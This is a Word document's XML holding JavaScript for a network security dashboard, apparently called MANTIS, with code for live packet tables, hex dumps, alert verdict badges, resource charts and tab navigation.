    <w:p w14:paraId="283ED741" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DD48EA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Packet viewer state ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E70DB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pktPaused = false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA6963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pktAutoScroll = true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DD96F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pktProto = 'ALL';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F4890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pktQuery = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E396D1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lastSeq = 0;            // highest packet no. already rendered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1BEB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pktCache = {};          // no -&gt; packet (for hex detail on click)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462FBB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const MAX_PKT_ROWS = 2000;  // cap DOM rows for smooth scrolling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3042ABE3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08C8F5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Chart Instance Variables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2090B7A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cpuChart, memChart;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE37BD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const maxDataPoints = 30; // Show last 30 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34126A41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41830B5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function initCharts() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B57E12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const commonOptions = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556469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responsive: true,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083074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maintainAspectRatio: false,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FB990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plugins: { legend: { display: false }, tooltip: { enabled: false } },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602A92F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scales: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C55A78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x: { display: false },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0912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y: { display: false, min: 0, max: 100 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4012E46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FD078F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elements: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBC7A4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point: { radius: 0 },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AB257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line: { tension: 0.4, borderWidth: 2 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C9513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E3DCF5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layout: { padding: 0 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24495D4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D8C710B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FD97D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const ctxCpu = document.getElementById('cpuChartCanvas').getContext('2d');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A9BA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cpuChart = new Chart(ctxCpu, {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B587F9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type: 'line',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2431A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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3092A81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labels: Array(maxDataPoints).fill(''),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0546757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datasets: [{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B13F4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data: Array(maxDataPoints).fill(0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4790D53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borderColor: '#256b86',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4F85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backgroundColor: 'rgba(37, 107, 134, 0.08)',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CB05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fill: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429E9E7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A31560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1BD2EF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options: commonOptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C09CD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154CCFE6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED0797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const ctxMem = document.getElementById('memChartCanvas').getContext('2d');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED03B3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memChart = new Chart(ctxMem, {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757DAD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type: 'line',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7167FB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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3A34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labels: Array(maxDataPoints).fill(''),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFA49F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datasets: [{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F5233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data: Array(maxDataPoints).fill(0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F54A05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borderColor: '#675a91',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C98F02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backgroundColor: 'rgba(103, 90, 145, 0.08)',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224185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fill: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AD17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97E0D5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3D39B6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options: commonOptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FE7B2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18C6E6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1772F7F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7465D4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function switchTab(tabId) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019FE4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document.querySelectorAll('.tab-content').forEach(el =&gt; el.classList.remove('active'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFE9A2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document.querySelectorAll('.nav-item').forEach(el =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6D9D4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el.classList.remove('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17382FA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el.setAttribute('aria-selected', 'false');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6189A2C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83605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document.getElementById(tabId).classList.add('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7A363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navTarget = document.querySelector(`[onclick="switchTab('${tabId}')"]`);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7E57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(navTarget) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEC2DE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navTarget.classList.add('active');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAA2A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navTarget.setAttribute('aria-selected', 'true');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212E193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08A3836" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="519B324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const pageCopy = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E5A7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'tab-overview': ['Security overview', 'Live host health, sensor status and detection activity'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A49D5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'tab-packets': ['Packet capture', 'Inspect and export packets observed by the sensor'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA310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'tab-alerts': ['Threat activity', 'Review classified alerts and mapped ATT&amp;CK techniques'],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BAAE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'tab-architecture': ['System design', 'Technical overview of the MANTIS detection pipeline']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC40F4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1B8A0C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const copy = pageCopy[tabId];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0A927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(copy) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A1271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document.getElementById('headerTitle').textContent = copy[0];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B66352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document.getElementById('headerSubtitle').textContent = copy[1];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1162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50F9D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32BD196" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="231464E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function escapeHtml(s) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60708E1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String(s).replace(/[&amp;&lt;&gt;"']/g, c =&gt; ({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590913A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'&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C44BA9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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B6745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99B0142" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A8C02E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function packetRowHtml(p) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08589E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protoClass = 'ws-' + (['TCP', 'UDP', 'ICMP'].includes(p.proto) ? p.proto : 'OTHER');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD2F4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(p.verdict &amp;&amp; p.verdict !== 'clean') protoClass = 'ws-MALICIOUS';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0819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verdictBadge = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B3EB9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(p.verdict === 'MALICIOUS')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6862E5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verdictBadge = ` &lt;span class="verdict-MALICIOUS"&gt;[MALICIOUS]&lt;/span&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3505056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else if (p.verdict === 'BLACKLIST')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAC65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verdictBadge = ` &lt;span class="verdict-BLACKLIST"&gt;[BLACKLIST]&lt;/span&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAEA05C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="724AB9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`&lt;tr class="wireshark-row" data-no="${p.no}" onclick="showPacketDetail(${p.no})"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AAC49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&lt;td&gt;${p.no}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D45128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&lt;td style="color:#64748b"&gt;${escapeHtml(p.time)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE3881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&lt;td&gt;${escapeHtml(p.src)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE816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&lt;td&gt;${escapeHtml(p.dst)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC7032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&lt;td class="${protoClass}"&gt;${escapeHtml(p.proto)}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D123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&lt;td&gt;${p.length}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594C87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&lt;td style="color:#94a3b8"&gt;${escapeHtml(p.info)}${verdictBadge}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EA855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&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0B2D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6E07D13" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D2B3AD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Wireshark-style hex + ASCII dump, built from the raw hex string</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7D040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function renderHexDump(hex) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1043A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bytes = [];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24013A7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(let i = 0; i &lt; hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2C890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out = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9181F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(let off = 0; off &lt; bytes.length; off += 16) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023307C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chunk = bytes.slice(off, off + 16);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABEB95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hexPart = chunk.map(b =&gt; b.toString(16).padStart(2, '0')).join(' ');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D9C44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hexPart = hexPart.padEnd(16 * 3 - 1, ' ');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4AED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ascii = chunk.map(b =&gt; (b &gt;= 32 &amp;&amp; b &lt; 127) ? String.fromCharCode(b) : '.').join('');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478AB7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 += off.toString(16).padStart(4, '0') + '  ' + hexPart + '  ' + escapeHtml(ascii) + '\n';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBBA4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C9329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out || '(no payload captured)';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B0B1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986DAFB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="558BB34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function showPacketDetail(no) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B69EB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p = pktCache[no];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596E5B9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 return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BD24A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document.querySelectorAll('.wireshark-row').forEach(r =&gt; r.classList.remove('selected'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6833B7E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row = document.querySelector(`.wireshark-row[data-no="${no}"]`);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232279A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if (row) row.classList.add('selected');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA29F23" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05BFF1E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header = `Packet #${p.no}   ${p.time}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAF41C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`${p.src}:${p.sport}  -&gt;  ${p.dst}:${p.dport}   ${p.proto}   ${p.length} bytes\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717BE8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`Info: ${p.info}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39993BB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 ${p.verdict}\n` +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4693B3D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`${'-'.repeat(58)}\n`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6818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document.getElementById('pktDetail').textContent = header + renderHexDump(p.hex || '');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538D33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document.getElementById('pktDetailCard').style.display = 'block';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0E5D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125ACC7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D62077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function resetPackets() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C52A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lastSeq = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF8D13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pktCache = {};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467FFBE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document.getElementById('wsTableBody').innerHTML = packetEmptyState();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F0D37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document.getElementById('pktDetailCard').style.display = 'none';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEC8B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0A3A06D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="604E4B1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function packetEmptyState() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A394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`&lt;tr&gt;&lt;td colspan="7" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C929E2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&lt;strong&gt;Waiting for captured traffic&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCA1D0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&lt;span&gt;Packets matching the current filter will appear here.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C86D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&lt;/td&gt;&lt;/tr&gt;`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F26971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6804139" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1153140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function setProtoFilter(v) { pktProto = v; resetPackets(); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3529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function setQueryFilter(v) { pktQuery = v.trim(); resetPackets(); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01894ACB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B07056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function togglePause() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2767B22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pktPaused = !pktPaused;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5029CD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btn = document.getElementById('pktPauseBtn');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAA913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btn.classList.toggle('paused', pktPaused);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2091D81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btn.innerText = pktPaused ? 'Resume' : 'Pause';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161B3CB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DF56DA9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B7CA7D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function toggleAutoScroll(cb) { pktAutoScroll = cb.checked; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383EB1FA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="583E8E5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async function fetchPackets() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E8C87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(pktPaused) return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675EB9D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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380D6E9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url = `/api/packets?after=${lastSeq}&amp;limit=500&amp;proto=${pktProto}`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7659454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(pktQuery) url += `&amp;q=${encodeURIComponent(pktQuery)}`;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C31F7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data = await (await fetch(url)).json();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D99EE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packets = data.packets;   // newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05602E33" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55D911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document.getElementById('pktBuffered').innerText = data.buffered;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038AC79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document.getElementById('pktTotal').innerText = data.total;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E16F73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document.getElementById('sidebarPacketCount').innerText = data.buffered;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5215F3C2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F35351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(packets.length) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274378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tbody = document.getElementById('wsTableBody');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628591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scroller = document.getElementById('pktScroll');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3939090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atTop = scroller.scrollTop &lt; 40;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1CFBAE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EF038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emptyRow = tbody.querySelector('.empty-state');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BDDED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(emptyRow) emptyRow.closest('tr').remove();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1B9834" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70AAED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packets.forEach(p =&gt; { pktCache[p.no] = p; });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6866A6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lastSeq = Math.max(lastSeq, packets[0].no);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4513925B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AE2906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tbody.insertAdjacentHTML('afterbegin', packets.map(packetRowHtml).join(''));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CB06CE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07D0CD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trim old rows to keep scrolling snappy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706B57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while (tbody.children.length &gt; MAX_PKT_ROWS) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6115DD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removed = tbody.lastChild;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEC2D3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delete pktCache[removed.getAttribute('data-no')];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659056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tbody.removeChild(removed);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D524D9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976F6A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(pktAutoScroll &amp;&amp; atTop) scroller.scrollTop = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E0BD5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FCC31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catch (e) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A17F7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document.getElementById('pktBuffered').innerText = '-';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A2E6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97444A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C7BB8A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7167B8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async function fetchStats() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3323E4A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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030738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response = await fetch('/api/stats');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4718068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data = await response.json();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBFED9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allAlerts = data.alerts;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0109DA2D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7203A59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Update Overview Metrics Numeric Text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F5A43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document.getElementById('cpuVal').innerText = data.cpu_usage;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA9ED7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document.getElementById('memVal').innerText = data.mem_usage;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240777A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document.getElementById('sensorVal').innerText = data.online_sensors;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D86D6F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document.getElementById('sidebarSensorCount').innerText = data.online_sensors;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F218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document.getElementById('totalEventsVal').innerText = data.total_alerts;</w:t>
      </w:r>
    </w:p>
